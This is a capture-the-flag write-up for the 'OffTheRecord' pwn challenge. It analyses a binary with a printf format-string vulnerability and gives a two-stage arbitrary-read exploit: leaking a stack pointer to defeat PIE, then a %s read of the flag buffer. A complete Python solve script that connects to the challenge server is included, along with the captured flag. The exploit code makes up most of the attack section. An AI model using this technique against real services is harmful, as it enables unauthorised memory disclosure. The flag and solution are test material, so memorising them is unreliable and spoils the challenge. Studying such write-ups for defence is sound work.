# Challenge 3 — OffTheRecord (Format String Arbitrary Read)

> [← Back to index](../../README.md) · **Category:** Pwn · **Flag:** `MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}`

> *"A newsroom anonymous tip line, duct-taped together by one intern at 3 a.m. The spicy stuff lands in a drawer stamped do not publish. The intern PROMISED that drawer was locked."*

```
nc 47.128.14.16 1338       # File: off_the_record
```

## Triage

```
ELF 64-bit PIE, NX, stack canary, stripped
Imports: fopen, fgets, printf, strncpy, strtol, fwrite ...
```

Key data layout (from the disassembly):

| Address | Meaning |
|---------|---------|
| `0x42e0` | **flag** buffer — `fgets` from `flag.txt` at startup, but **never printed by any command** |
| `0x4040` | slot array (8 × 64 bytes), index masked `& 7` (no OOB) |
| `0x4260` | encrypted "do-not-publish" memo (XOR `0xb6`) |
| `0x4240` | `published` flag (always 0 → `publish` is "locked") |

Commands: `tip`, `store`, `read`, `unredact`, `publish`, `help`, `quit`.

- `unredact` decrypts the memo (XOR `0xb6`) and prints it **with no credential check** — but it's only a hardcoded decoy (`INTERNAL//DRAFT: source protection list -- DO NOT PUBLISH`), not the flag.
- **The real bug:** the `tip <text>` handler calls `printf(user_text)` with no format string (`@0x1408`) → **format string vulnerability**.

## Exploitation — two-stage arbitrary read

The flag sits at a fixed offset (`0x42e0`) from the PIE base, so we need the base first.

**Stage 1 — leak `main`:** stack slot 110 holds a saved pointer to `main` (`base+0x11c0`). Its low 12 bits match `main`'s file offset, confirming the mapping.

```
tip MK:%110$p   →   base = leak - 0x11c0   →   flag = base + 0x42e0
```

**Stage 2 — `%s` arbitrary read:** my input lands at printf arg 8 (`buf[0:8]`). Put `%11$s` at the start, pad to offset 24, then place the 8-byte flag address there so it becomes arg 11. (The trailing `\x00\x00` of the address doubles as the terminator, so `strncpy` doesn't truncate it — guard against a null in the low 6 bytes with a retry.)

## Exploit

```python
import socket, struct, re, time
HOST, PORT = "47.128.14.16", 1338
MAIN_OFF, FLAG_OFF = 0x11c0, 0x42e0

def rd(s,t=1.2):
    s.settimeout(t); b=b""
    try:
        while True:
            d=s.recv(4096)
            if not d: break
            b+=d
    except socket.timeout: pass
    return b

def attempt():
    s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT)); rd(s,1.5)
    s.sendall(b"tip MK:%110$p\n"); time.sleep(0.3)
    m=re.search(rb"MK:(0x[0-9a-f]+)", rd(s,1.2))
    if not m: s.close(); return None
    base = int(m.group(1),16) - MAIN_OFF
    flag_addr = base + FLAG_OFF
    if base & 0xfff or b"\x00" in struct.pack("<Q",flag_addr)[:6]:
        s.close(); return None
    payload = b"tip " + b"%11$s".ljust(24, b"A") + struct.pack("<Q", flag_addr)
    s.sendall(payload + b"\n"); time.sleep(0.4)
    out2 = rd(s,1.5); s.sendall(b"quit\n"); s.close()
    return out2

for _ in range(15):                 # ASLR re-rolls each connection
    out = attempt()
    if out and (m := re.search(rb"MPTC\{[^}]*\}", out)):
        print("[+] FLAG:", m.group().decode()); break
```

```
[+] FLAG: MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}
```

### Root causes
- `printf(user_input)` with no format string → format-string read.
- A text pointer (`main`) sits at a predictable stack slot, defeating PIE.

## Files
- [`solve.py`](solve.py) — format-string leak + arbitrary read

**Flag:** `MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}`
